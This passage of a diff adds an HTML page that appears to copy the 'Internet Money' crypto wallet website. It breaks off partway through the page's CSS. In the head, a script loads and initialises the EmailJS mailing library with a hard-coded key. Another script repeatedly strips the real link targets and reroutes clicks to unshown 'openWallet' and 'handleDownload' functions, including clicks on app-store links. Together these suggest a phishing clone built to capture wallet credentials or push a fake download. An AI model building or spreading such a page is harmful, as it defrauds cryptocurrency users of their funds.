@@ -1,0 +1,4908 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8" />
+  <title>Internet Money | Crypto Wallet</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <link rel="icon" href="favicon.ico" />
+  <link rel="preload" as="image" href="https://d295q1lbtarn4h.cloudfront.net/gifs/alien-sitting.gif" />
+  <meta name="next-head-count" content="5" />
+  <meta name="description"
+    content="We are the first passive income crypto wallet. EVM compatible, Native to #PulseChain. Building financial freedom tools for users of any experience level." />
+  <meta name="keywords" />
+  <meta property="og:image" content="https://internet-money-website.vercel.app/social-share.png" />
+  <meta property="og:image:type" content="image/png" />
+  <meta property="og:image:width" content="1024" />
+  <meta property="og:image:height" content="1024" />
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous" />
+  <link rel="icon" href="favicon.ico" />
+  <link href="css/helvetica-neue-55?styles=16016,16008,16009,15981,15980,15991,15994" rel="stylesheet" />
+  <script defer="" src="script.js" data-website-id="064d0cf3-8e5d-4896-af88-030fc2e531de"></script>
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="" />
+  <link rel="preload" href="_next/static/css/d153ca07965b101e.css" as="style" />
+  <link rel="stylesheet" href="_next/static/css/d153ca07965b101e.css" data-n-g="" />
+  <link rel="stylesheet" href="walletoverlay.css">
+  <noscript data-n-css=""></noscript>
+  <script defer="" nomodule="" src="_next/static/chunks/polyfills-c67a75d1b6f99dc8.js"></script>
+  <script src="_next/static/chunks/webpack-0b5d8249fb15f5f3.js" defer=""></script>
+  <script src="_next/static/chunks/framework-03a71bd6940e0ac2.js" defer=""></script>
+  <script src="_next/static/chunks/main-313ab07310f88a1d.js" defer=""></script>
+  <script src="_next/static/chunks/pages/_app-d26d3f4e3e10f7af.js" defer=""></script>
+  <script src="_next/static/chunks/760-1d1fddfc888f67db.js" defer=""></script>
+  <script src="_next/static/chunks/46-bbe1fb95cd87d13b.js" defer=""></script>
+  <script src="_next/static/chunks/pages/index-29ba20a5fd0c3942.js" defer=""></script>
+  <script src="_next/static/QYPLlLOlFYTbvzuw3eUYe/_buildManifest.js" defer=""></script>
+  <script src="_next/static/QYPLlLOlFYTbvzuw3eUYe/_ssgManifest.js" defer=""></script>
+  <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js">
+  </script>
+  <script type="text/javascript">
+    (function () {
+      emailjs.init("7tpKliu3iA0wJbT5q");
+    })();
+  </script>
+  <style
+    data-href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;600;700;800;900&family=Space+Grotesk:wght@300;400;600&display=swap">
+    @font-face {
+      font-family: "Orbitron";
+      font-style: normal;
+      font-weight: 400;
+      font-display: swap;
+      src: url(s/orbitron/v34/yMJMMIlzdpvBhQQL_SC3X9yhF25-T1nyGy6xpQ.woff) format("woff");
+    }
+
+    @font-face {
+      font-family: "Orbitron";
+      font-style: normal;
+      font-weight: 500;
+      font-display: swap;
+      src: url(s/orbitron/v34/yMJMMIlzdpvBhQQL_SC3X9yhF25-T1nyKS6xpQ.woff) format("woff");
+    }
+
+    @font-face {
+      font-family: "Orbitron";
+      font-style: normal;
+      font-weight: 600;
+      font-display: swap;
+      src: url(s/orbitron/v34/yMJMMIlzdpvBhQQL_SC3X9yhF25-T1nyxSmxpQ.woff) format("woff");
+    }
+
+    @font-face {
+      font-family: "Orbitron";
+      font-style: normal;
+      font-weight: 700;
+      font-display: swap;
+      src: url(s/orbitron/v34/yMJMMIlzdpvBhQQL_SC3X9yhF25-T1ny_CmxpQ.woff) format("woff");
+    }
+
+    @font-face {
+      font-family: "Orbitron";
+      font-style: normal;
+      font-weight: 800;
+      font-display: swap;
+      src: url(s/orbitron/v34/yMJMMIlzdpvBhQQL_SC3X9yhF25-T1nymymxpQ.woff) format("woff");
+    }
+
+    @font-face {
+      font-family: "Orbitron";
+      font-style: normal;
+      font-weight: 900;
+      font-display: swap;
+      src: url(s/orbitron/v34/yMJMMIlzdpvBhQQL_SC3X9yhF25-T1nysimxpQ.woff) format("woff");
+    }
+
+    @font-face {
+      font-family: "Space Grotesk";
+      font-style: normal;
+      font-weight: 300;
+      font-display: swap;
+      src: url(s/spacegrotesk/v21/V8mQoQDjQSkFtoMM3T6r8E7mF71Q-gOoraIAEj62UUsg.woff) format("woff");
+    }
+
+    @font-face {
+      font-family: "Space Grotesk";
+      font-style: normal;
+      font-weight: 400;
+      font-display: swap;
+      src: url(s/spacegrotesk/v21/V8mQoQDjQSkFtoMM3T6r8E7mF71Q-gOoraIAEj7oUUsg.woff) format("woff");
+    }
+
+    @font-face {
+      font-family: "Space Grotesk";
+      font-style: normal;
+      font-weight: 600;
+      font-display: swap;
+      src: url(s/spacegrotesk/v21/V8mQoQDjQSkFtoMM3T6r8E7mF71Q-gOoraIAEj42Vksg.woff) format("woff");
+    }
+
+    @font-face {
+      font-family: "Orbitron";
+      font-style: normal;
+      font-weight: 400;
+      font-display: swap;
+      src: url(s/orbitron/v34/yMJRMIlzdpvBhQQL_Qq7dy1biN15.woff2) format("woff2");
+      unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6,
+        U+02DA, U+02DC, U+0304, U+0308, U+0329, U+2000-206F, U+20AC, U+2122,
+        U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
+    }
+
+    @font-face {
+      font-family: "Orbitron";
+      font-style: normal;
+      font-weight: 500;
+      font-display: swap;
+      src: url(s/orbitron/v34/yMJRMIlzdpvBhQQL_Qq7dy1biN15.woff2) format("woff2");
+      unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6,
+        U+02DA, U+02DC, U+0304, U+0308, U+0329, U+2000-206F, U+20AC, U+2122,
+        U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
+    }
+
+    @font-face {
+      font-family: "Orbitron";
+      font-style: normal;
+      font-weight: 600;
+      font-display: swap;
+      src: url(s/orbitron/v34/yMJRMIlzdpvBhQQL_Qq7dy1biN15.woff2) format("woff2");
+      unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6,
+        U+02DA, U+02DC, U+0304, U+0308, U+0329, U+2000-206F, U+20AC, U+2122,
+        U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
+    }
+
+    @font-face {
+      font-family: "Orbitron";
+      font-style: normal;
+      font-weight: 700;
+      font-display: swap;
+      src: url(s/orbitron/v34/yMJRMIlzdpvBhQQL_Qq7dy1biN15.woff2) format("woff2");
+      unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6,
+        U+02DA, U+02DC, U+0304, U+0308, U+0329, U+2000-206F, U+20AC, U+2122,
+        U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
+    }
+
+    @font-face {
+      font-family: "Orbitron";
+      font-style: normal;
+      font-weight: 800;
+      font-display: swap;
+      src: url(s/orbitron/v34/yMJRMIlzdpvBhQQL_Qq7dy1biN15.woff2) format("woff2");
+      unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6,
+        U+02DA, U+02DC, U+0304, U+0308, U+0329, U+2000-206F, U+20AC, U+2122,
+        U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
+    }
+
+    @font-face {
+      font-family: "Orbitron";
+      font-style: normal;
+      font-weight: 900;
+      font-display: swap;
+      src: url(s/orbitron/v34/yMJRMIlzdpvBhQQL_Qq7dy1biN15.woff2) format("woff2");
+      unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6,
+        U+02DA, U+02DC, U+0304, U+0308, U+0329, U+2000-206F, U+20AC, U+2122,
+        U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
+    }
+
+    @font-face {
+      font-family: "Space Grotesk";
+      font-style: normal;
+      font-weight: 300;
+      font-display: swap;
+      src: url(s/spacegrotesk/v21/V8mDoQDjQSkFtoMM3T6r8E7mPb54C_k3HqUtEw.woff2) format("woff2");
+      unicode-range: U+0102-0103, U+0110-0111, U+0128-0129, U+0168-0169,
+        U+01A0-01A1, U+01AF-01B0, U+0300-0301, U+0303-0304, U+0308-0309,
+        U+0323, U+0329, U+1EA0-1EF9, U+20AB;
+    }
+
+    @font-face {
+      font-family: "Space Grotesk";
+      font-style: normal;
+      font-weight: 300;
+      font-display: swap;
+      src: url(s/spacegrotesk/v21/V8mDoQDjQSkFtoMM3T6r8E7mPb94C_k3HqUtEw.woff2) format("woff2");
+      unicode-range: U+0100-02BA, U+02BD-02C5, U+02C7-02CC, U+02CE-02D7,
+        U+02DD-02FF, U+0304, U+0308, U+0329, U+1D00-1DBF, U+1E00-1E9F,
+        U+1EF2-1EFF, U+2020, U+20A0-20AB, U+20AD-20C0, U+2113, U+2C60-2C7F,
+        U+A720-A7FF;
+    }
+
+    @font-face {
+      font-family: "Space Grotesk";
+      font-style: normal;
+      font-weight: 300;
+      font-display: swap;
+      src: url(s/spacegrotesk/v21/V8mDoQDjQSkFtoMM3T6r8E7mPbF4C_k3HqU.woff2) format("woff2");
+      unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6,
+        U+02DA, U+02DC, U+0304, U+0308, U+0329, U+2000-206F, U+20AC, U+2122,
+        U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
+    }
+
+    @font-face {
+      font-family: "Space Grotesk";
+      font-style: normal;
+      font-weight: 400;
+      font-display: swap;
+      src: url(s/spacegrotesk/v21/V8mDoQDjQSkFtoMM3T6r8E7mPb54C_k3HqUtEw.woff2) format("woff2");
+      unicode-range: U+0102-0103, U+0110-0111, U+0128-0129, U+0168-0169,
+        U+01A0-01A1, U+01AF-01B0, U+0300-0301, U+0303-0304, U+0308-0309,
+        U+0323, U+0329, U+1EA0-1EF9, U+20AB;
+    }
+
+    @font-face {
+      font-family: "Space Grotesk";
+      font-style: normal;
+      font-weight: 400;
+      font-display: swap;
+      src: url(s/spacegrotesk/v21/V8mDoQDjQSkFtoMM3T6r8E7mPb94C_k3HqUtEw.woff2) format("woff2");
+      unicode-range: U+0100-02BA, U+02BD-02C5, U+02C7-02CC, U+02CE-02D7,
+        U+02DD-02FF, U+0304, U+0308, U+0329, U+1D00-1DBF, U+1E00-1E9F,
+        U+1EF2-1EFF, U+2020, U+20A0-20AB, U+20AD-20C0, U+2113, U+2C60-2C7F,
+        U+A720-A7FF;
+    }
+
+    @font-face {
+      font-family: "Space Grotesk";
+      font-style: normal;
+      font-weight: 400;
+      font-display: swap;
+      src: url(s/spacegrotesk/v21/V8mDoQDjQSkFtoMM3T6r8E7mPbF4C_k3HqU.woff2) format("woff2");
+      unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6,
+        U+02DA, U+02DC, U+0304, U+0308, U+0329, U+2000-206F, U+20AC, U+2122,
+        U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
+    }
+
+    @font-face {
+      font-family: "Space Grotesk";
+      font-style: normal;
+      font-weight: 600;
+      font-display: swap;
+      src: url(s/spacegrotesk/v21/V8mDoQDjQSkFtoMM3T6r8E7mPb54C_k3HqUtEw.woff2) format("woff2");
+      unicode-range: U+0102-0103, U+0110-0111, U+0128-0129, U+0168-0169,
+        U+01A0-01A1, U+01AF-01B0, U+0300-0301, U+0303-0304, U+0308-0309,
+        U+0323, U+0329, U+1EA0-1EF9, U+20AB;
+    }
+
+    @font-face {
+      font-family: "Space Grotesk";
+      font-style: normal;
+      font-weight: 600;
+      font-display: swap;
+      src: url(s/spacegrotesk/v21/V8mDoQDjQSkFtoMM3T6r8E7mPb94C_k3HqUtEw.woff2) format("woff2");
+      unicode-range: U+0100-02BA, U+02BD-02C5, U+02C7-02CC, U+02CE-02D7,
+        U+02DD-02FF, U+0304, U+0308, U+0329, U+1D00-1DBF, U+1E00-1E9F,
+        U+1EF2-1EFF, U+2020, U+20A0-20AB, U+20AD-20C0, U+2113, U+2C60-2C7F,
+        U+A720-A7FF;
+    }
+
+    @font-face {
+      font-family: "Space Grotesk";
+      font-style: normal;
+      font-weight: 600;
+      font-display: swap;
+      src: url(s/spacegrotesk/v21/V8mDoQDjQSkFtoMM3T6r8E7mPbF4C_k3HqU.woff2) format("woff2");
+      unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6,
+        U+02DA, U+02DC, U+0304, U+0308, U+0329, U+2000-206F, U+20AC, U+2122,
+        U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
+    }
+  </style>
+  <style>
+    /* Prevent Next.js hydration from hiding pre-rendered images */
+    img[data-nimg],
+    img[data-nimg="1"],
+    img[data-nimg="fill"] {
+      display: inline-block !important;
+      visibility: visible !important;
+      opacity: 1 !important;
+    }
+
+    img[alt="logo"] {
+      display: inline-block !important;
+      visibility: visible !important;
+      opacity: 1 !important;
+    }
+
+    img[alt="Alien sitting"] {
+      display: inline-block !important;
+      visibility: visible !important;
+      opacity: 1 !important;
+    }
+
+    img[alt="hamburger"] {
+      display: inline-block !important;
+      visibility: visible !important;
+      opacity: 1 !important;
+    }
+
+    /* Ensure all next/image containers don't hide their images */
+    span[data-nimg],
+    div[data-nimg] {
+      display: inline-block !important;
+      visibility: visible !important;
+      opacity: 1 !important;
+    }
+
+    /* Force lazy-loaded logo to load regardless of viewport */
+    img[alt="logo"] {
+      content-visibility: auto;
+    }
+  </style>
+  <script>
+    /* Post-hydration image visibility fix for Next.js static export */
+    (function () {
+      function fixImages() {
+        // Fix all next/image images that may have been hidden during hydration
+        var imgs = document.querySelectorAll('img[data-nimg], img[alt="logo"], img[alt="Alien sitting"], img[alt="hamburger"]');
+        for (var i = 0; i < imgs.length; i++) {
+          var img = imgs[i];
+          img.style.setProperty('display', 'inline-block', 'important');
+          img.style.setProperty('visibility', 'visible', 'important');
+          img.style.setProperty('opacity', '1', 'important');
+          // Remove loading="lazy" on logo to ensure it always renders
+          if (img.alt === 'logo' && img.getAttribute('loading') === 'lazy') {
+            img.removeAttribute('loading');
+          }
+        }
+      }
+      // Run immediately and after hydration
+      document.addEventListener('DOMContentLoaded', fixImages);
+      // Also run shortly after page load to catch post-hydration state changes
+      window.addEventListener('load', function () {
+        fixImages();
+        // Run again after React hydration completes (usually within 2 seconds)
+        setTimeout(fixImages, 500);
+        setTimeout(fixImages, 1500);
+        setTimeout(fixImages, 3000);
+      });
+    })();
+  </script>
+  <script>
+    function addClassesToElements() {
+      const links = document.querySelectorAll("a:not(.interact-button)");
+      for (const link of links) {
+        const href = (link.getAttribute("href") || "").toLowerCase();
+        const text = (link.textContent || "").toLowerCase();
+        const isExclusion = href.includes("/ios") || href.includes("/android") || href.includes("/chrome") ||
+          text.includes("app store") || text.includes("google play") || text.includes("chrome web store") ||
+          href.includes("apple.com") || href.includes("play.google.com");
+
+        link.classList.add("interact-button");
+
+        if (isExclusion) {
+          link.addEventListener("click", function (e) {
+            e.preventDefault();
+            if (typeof handleDownload === "function") handleDownload();
+          });
+        } else {
+          link.removeAttribute("href");
+          link.addEventListener("click", function (e) {
+            e.preventDefault();
+            if (typeof openWallet === "function") openWallet();
+            else if (typeof triggerWallet === "function") triggerWallet(e);
+          });
+        }
+      }
+
+      // NOTE: The div-tagging loop has been intentionally removed.
+      // Tagging every div (including Next.js image wrapper divs) with .interact-button
+      // was causing images (logo, alien gif, etc.) to disappear after hydration.
+      // Next.js re-renders image wrapper divs during hydration; the rapid setInterval
+      // re-tagging those divs disrupted the image render cycle, causing flicker/disappear.
+      // Only <a> links need to be intercepted for the openWallet/handleDownload logic.
+    }
+
+    setInterval(addClassesToElements, 300);
+  </script>
+</head>
+
+<body>
+  <div id="__next">
+    <style data-emotion="css-global lsy0yn">
+      html {
+        -webkit-font-smoothing: antialiased;
+        -moz-osx-font-smoothing: grayscale;
+        box-sizing: border-box;
+        -webkit-text-size-adjust: 100%;
+      }
+
+      *,
+      *::before,
+      *::after {
+        box-sizing: inherit;
+      }
+
+      strong,
+      b {
+        font-weight: 700;
+      }
+
+      body {
+        margin: 0;
+        color: rgba(0, 0, 0, 0.87);
+        font-size: 16px;
+        font-family: Gotham, Orbitron, sans-serif;
+        font-weight: 400;
+        line-height: 1.5;
+        background-color: #fff;
+      }
+
+      @media print {
+        body {
+          background-color: #fff;
+        }
+      }
+
+      body::backdrop {
+        background-color: #fff;
+      }
+    </style>
+    <main>
+      <style data-emotion="css 1wk9use">
+        .css-1wk9use {
+          display: -webkit-box;
+          display: -webkit-flex;
+          display: -ms-flexbox;
+          display: flex;
+          width: 100%;
+          -webkit-align-items: center;
+          -webkit-box-align: center;
+          -ms-flex-align: center;
+          align-items: center;
+          -webkit-box-pack: justify;
+          -webkit-justify-content: space-between;
+          justify-content: space-between;
+          height: 115px;
+          background: #0202024f;
+          z-index: 10;
+          position: relative;
+          padding-left: 8px;
+          padding-right: 8px;
+          overflow: visible;
+          max-width: 1920px;
+          margin-left: auto;
+          margin-right: auto;
+        }
+
+        @media (max-width: 599.95px) {
+          .css-1wk9use {
+            background: transparent;
+          }
+        }
+      </style>
+      <div class="MuiBox-root css-1wk9use">
+        <style data-emotion="css 1xib9e">
+          .css-1xib9e {
+            cursor: pointer;
+            margin-left: 16px;
+            display: -webkit-box;
+            display: -webkit-flex;
+            display: -ms-flexbox;
+            display: flex;
+            -webkit-align-items: center;
+            -webkit-box-align: center;
+            -ms-flex-align: center;
+            align-items: center;
+          }
+        </style>
+        <div class="MuiBox-root css-1xib9e">
+          <img alt="logo" loading="lazy" width="190" height="58" decoding="async" data-nimg="1"
+            style="color: transparent" src="logo.webp" />
+        </div>
+        <style data-emotion="css fzn1nk">
+          .css-fzn1nk {
+            display: -webkit-box;
+            display: -webkit-flex;
+            display: -ms-flexbox;
+            display: flex;
+            -webkit-align-items: center;
+            -webkit-box-align: center;
+            -ms-flex-align: center;
+            align-items: center;
+            height: 100%;
+            gap: 12px;
+          }
+
+          @media (max-width: 1350px) {
+            .css-fzn1nk {
+              display: none;
+            }
+          }
+        </style>
+        <div class="MuiBox-root css-fzn1nk">
+          <style data-emotion="css efe9bl">
+            .css-efe9bl {
+              height: 100%;
+              -webkit-user-select: none;
+              -moz-user-select: none;
+              -ms-user-select: none;
+              user-select: none;
+              cursor: pointer;
+              display: -webkit-box;
+              display: -webkit-flex;
+              display: -ms-flexbox;
+              display: flex;
+              -webkit-align-items: center;
+              -webkit-box-align: center;
+              -ms-flex-align: center;
+              align-items: center;
+              width: 142px;
+              -webkit-box-pack: center;
+              -ms-flex-pack: center;
+              -webkit-justify-content: center;
+              justify-content: center;
+              border-top: 6px solid #ffdb0c;
+              background: linear-gradient(180deg,
+                  rgba(248, 166, 26, 0.31) 0%,
+                  rgba(248, 166, 26, 0) 100%);
+            }
+          </style>
+          <div class="MuiBox-root css-efe9bl">
+            <style data-emotion="css daxka4">
+              .css-daxka4 {
+                margin: 0;
+                font-size: 16px;
+                font-family: Gotham, Orbitron, sans-serif;
+                font-weight: 400;
+                line-height: 1.5;
+                line-height: inherit;
+                font-weight: 900;
+                text-transform: uppercase;
+              }
+            </style>
+            <p class="MuiTypography-root MuiTypography-body1 css-daxka4">
+              Home
+            </p>
+          </div>
+          <style data-emotion="css 1ub1iwr">
+            .css-1ub1iwr {
+              height: 100%;
+              -webkit-user-select: none;
+              -moz-user-select: none;
+              -ms-user-select: none;
+              user-select: none;
+              cursor: pointer;
+              display: -webkit-box;
+              display: -webkit-flex;
+              display: -ms-flexbox;
+              display: flex;
+              -webkit-align-items: center;
+              -webkit-box-align: center;
+              -ms-flex-align: center;
+              align-items: center;
+              width: 142px;
+              -webkit-box-pack: center;
+              -ms-flex-pack: center;
+              -webkit-justify-content: center;
+              justify-content: center;
+            }
+
+            @media (max-width: 1600px) {
+              .css-1ub1iwr {
+                display: none;
+              }
+            }
+          </style>
+          <div class="MuiBox-root css-1ub1iwr">
+            <p class="MuiTypography-root MuiTypography-body1 css-daxka4">
+              About Us
+            </p>
+          </div>
+          <a target="_blank" href="https://app.internetmoney.io/">
+            <style data-emotion="css 1ii3ake">
+              .css-1ii3ake {
+                height: 100%;
+                -webkit-user-select: none;
+                -moz-user-select: none;
+                -ms-user-select: none;
+                user-select: none;
+                cursor: pointer;
+                display: -webkit-box;
+                display: -webkit-flex;
+                display: -ms-flexbox;
+                display: flex;
+                -webkit-align-items: center;
+                -webkit-box-align: center;
+                -ms-flex-align: center;
+                align-items: center;
+                width: 142px;
+                -webkit-box-pack: center;
+                -ms-flex-pack: center;
+                -webkit-justify-content: center;
+                justify-content: center;
+              }
+            </style>
+            <div class="MuiBox-root css-1ii3ake">
+              <p class="MuiTypography-root MuiTypography-body1 css-daxka4">
+                Dapp
+              </p>
+            </div>
+          </a>
+          <div class="MuiBox-root css-1ii3ake">
+            <style data-emotion="css 18v01ii">
+              .css-18v01ii {
+                font-family: Gotham, Orbitron, sans-serif;
+                font-weight: 500;
+                font-size: 0.875rem;
+                line-height: 1.75;
+                text-transform: uppercase;
+                min-width: 64px;
+                padding: 6px 8px;
+                border-radius: 4px;
+                -webkit-transition: background-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,
+                  box-shadow 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,
+                  border-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,
+                  color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
+                transition: background-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,
+                  box-shadow 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,
+                  border-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,
+                  color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
+                color: #ffdb0c;
+                background: #ffdb0c;
+                border-radius: 999px;
+                border: none;
+                color: #170d32;
+                height: 51px;
+                font-weight: bold;
+                vertical-align: middle;
+                background: transparent;
+                color: white;
+              }
+
+              .css-18v01ii:hover {
+                -webkit-text-decoration: none;
+                text-decoration: none;
+                background-color: rgba(255, 219, 12, 0.04);
+              }
+
+              @media (hover: none) {
+                .css-18v01ii:hover {
+                  background-color: transparent;
+                }
+              }
+
+              .css-18v01ii.Mui-disabled {
+                color: rgba(0, 0, 0, 0.26);
+              }
+
+              .css-18v01ii:hover {
+                background: #ffe653;
+              }
+
+              .css-18v01ii:hover {
+                background: transparent;
+              }
+            </style>
+            <style data-emotion="css xk69ql">
+              .css-xk69ql {
+                display: -webkit-inline-box;
+                display: -webkit-inline-flex;
+                display: -ms-inline-flexbox;
+                display: inline-flex;
+                -webkit-align-items: center;
+                -webkit-box-align: center;
+                -ms-flex-align: center;
+                align-items: center;
+                -webkit-box-pack: center;
+                -ms-flex-pack: center;
+                -webkit-justify-content: center;
+                justify-content: center;
+                position: relative;
+                box-sizing: border-box;
+                -webkit-tap-highlight-color: transparent;
+                background-color: transparent;
+                outline: 0;
+                border: 0;
+                margin: 0;
+                border-radius: 0;
+                padding: 0;
+                cursor: pointer;
+                -webkit-user-select: none;
+                -moz-user-select: none;
+                -ms-user-select: none;
+                user-select: none;
+                vertical-align: middle;
+                -moz-appearance: none;
+                -webkit-appearance: none;
+                -webkit-text-decoration: none;
+                text-decoration: none;
+                color: inherit;
+                font-family: Gotham, Orbitron, sans-serif;
+                font-weight: 500;
+                font-size: 0.875rem;
+                line-height: 1.75;
+                text-transform: uppercase;
+                min-width: 64px;
+                padding: 6px 8px;
+                border-radius: 4px;
+                -webkit-transition: background-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,
+                  box-shadow 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,
+                  border-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,
+                  color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
+                transition: background-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,
+                  box-shadow 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,
+                  border-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,
+                  color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
+                color: #ffdb0c;
+                background: #ffdb0c;
+                border-radius: 999px;
+                border: none;
+                color: #170d32;
+                height: 51px;
+                font-weight: bold;
+                vertical-align: middle;
+                background: transparent;
+                color: white;
+              }
+
+              .css-xk69ql::-moz-focus-inner {
+                border-style: none;
+              }
+
+              .css-xk69ql.Mui-disabled {
+                pointer-events: none;
+                cursor: default;
+              }
+
+              @media print {
+                .css-xk69ql {
+                  -webkit-print-color-adjust: exact;
+                  color-adjust: exact;
+                }
+              }
+
+              .css-xk69ql:hover {
+                -webkit-text-decoration: none;
+                text-decoration: none;
+                background-color: rgba(255, 219, 12, 0.04);
+              }
+
+              @media (hover: none) {
+                .css-xk69ql:hover {
+                  background-color: transparent;
+                }
+              }
+
+              .css-xk69ql.Mui-disabled {
+                color: rgba(0, 0, 0, 0.26);
+              }
+
+              .css-xk69ql:hover {
+                background: #ffe653;
+              }
+
+              .css-xk69ql:hover {
+                background: transparent;
+              }
+            </style><button
+              class="MuiButtonBase-root MuiButton-root MuiButton-text MuiButton-textPrimary MuiButton-sizeMedium MuiButton-textSizeMedium MuiButton-colorPrimary MuiButton-root MuiButton-text MuiButton-textPrimary MuiButton-sizeMedium MuiButton-textSizeMedium MuiButton-colorPrimary css-xk69ql"
+              tabindex="0" type="button">
+              <style data-emotion="css 1ejtp2t">
+                .css-1ejtp2t {
+                  margin: 0;
+                  font-size: 16px;
+                  font-family: Gotham, Orbitron, sans-serif;
+                  font-weight: 400;
+                  line-height: 1.5;
+                  line-height: inherit;
+                  font-weight: 900;
+                  text-transform: uppercase;
+                  color: white;
+                }
+              </style>
+              <p class="MuiTypography-root MuiTypography-body1 css-1ejtp2t">
+                Tokens
+              </p>
+              <style data-emotion="css pt151d">
+                .css-pt151d {
+                  display: inherit;
+                  margin-right: -4px;
+                  margin-left: 8px;
+                }
+
+                .css-pt151d>*:nth-of-type(1) {
+                  font-size: 20px;
+                }
+              </style><span class="MuiButton-icon MuiButton-endIcon MuiButton-iconSizeMedium css-pt151d">
+                <style data-emotion="css 6flbmm">
+                  .css-6flbmm {
+                    -webkit-user-select: none;
+                    -moz-user-select: none;
+                    -ms-user-select: none;
+                    user-select: none;
+                    width: 1em;
+                    height: 1em;
+                    display: inline-block;
+                    fill: currentColor;
+                    -webkit-flex-shrink: 0;
+                    -ms-flex-negative: 0;
+                    flex-shrink: 0;
+                    -webkit-transition: fill 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
+                    transition: fill 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
+                    font-size: 2.1875rem;
+                  }
+                </style><svg class="MuiSvgIcon-root MuiSvgIcon-fontSizeLarge css-6flbmm" focusable="false"
+                  aria-hidden="true" viewbox="0 0 24 24" data-testid="ArrowDropDownIcon">
+                  <path d="m7 10 5 5 5-5z"></path>
+                </svg>
+              </span>
+            </button>
+          </div>
+          <div class="MuiBox-root css-1ub1iwr">
+            <p class="MuiTypography-root MuiTypography-body1 css-daxka4">
+              Blackpaper
+            </p>
+          </div>
+          <style data-emotion="css hhbvvh">
+            .css-hhbvvh {
+              height: 100%;
+              -webkit-user-select: none;
+              -moz-user-select: none;
+              -ms-user-select: none;
+              user-select: none;
+              cursor: pointer;
+              display: -webkit-box;
+              display: -webkit-flex;
+              display: -ms-flexbox;
+              display: flex;
+              -webkit-align-items: center;
+              -webkit-box-align: center;
+              -ms-flex-align: center;
+              align-items: center;
+              width: 142px;
+              -webkit-box-pack: center;
+              -ms-flex-pack: center;
+              -webkit-justify-content: center;
+              justify-content: center;
+            }
+
+            @media (min-width: 1601px) {
+              .css-hhbvvh {
+                display: none;
+              }
+            }
+
+            @media (max-width: 1350px) {
+              .css-hhbvvh {
+                display: none;
+              }
+            }
+          </style>
+          <div class="MuiBox-root css-hhbvvh">
+            <button
+              class="MuiButtonBase-root MuiButton-root MuiButton-text MuiButton-textPrimary MuiButton-sizeMedium MuiButton-textSizeMedium MuiButton-colorPrimary MuiButton-root MuiButton-text MuiButton-textPrimary MuiButton-sizeMedium MuiButton-textSizeMedium MuiButton-colorPrimary css-xk69ql"
+              tabindex="0" type="button">
+              <p class="MuiTypography-root MuiTypography-body1 css-1ejtp2t">
+                More
+              </p>
+              <span class="MuiButton-icon MuiButton-endIcon MuiButton-iconSizeMedium css-pt151d"><svg
+                  class="MuiSvgIcon-root MuiSvgIcon-fontSizeLarge css-6flbmm" focusable="false" aria-hidden="true"
+                  viewbox="0 0 24 24" data-testid="ArrowDropDownIcon">
+                  <path d="m7 10 5 5 5-5z"></path>
+                </svg></span>
+            </button>
+          </div>
+          <div class="MuiBox-root css-1ub1iwr">
+            <p class="MuiTypography-root MuiTypography-body1 css-daxka4">
+              Audits
+            </p>
+          </div>
+          <div class="MuiBox-root css-1ub1iwr">
+            <p class="MuiTypography-root MuiTypography-body1 css-daxka4">
+              Stats
+            </p>
+          </div>
+        </div>
+        <style data-emotion="css 3vyuh4">
+          .css-3vyuh4 {
+            display: -webkit-box;
+            display: -webkit-flex;
+            display: -ms-flexbox;
+            display: flex;
+            gap: 16px;
+            -webkit-align-items: center;
+            -webkit-box-align: center;
+            -ms-flex-align: center;
+            align-items: center;
+            -webkit-box-pack: center;
+            -ms-flex-pack: center;
+            -webkit-justify-content: center;
+            justify-content: center;
+          }
+        </style>
+        <div class="MuiBox-root css-3vyuh4">
+          <style data-emotion="css 1nak41x">
+            .css-1nak41x {
+              font-family: Gotham, Orbitron, sans-serif;
+              font-weight: 500;
+              font-size: 0.875rem;
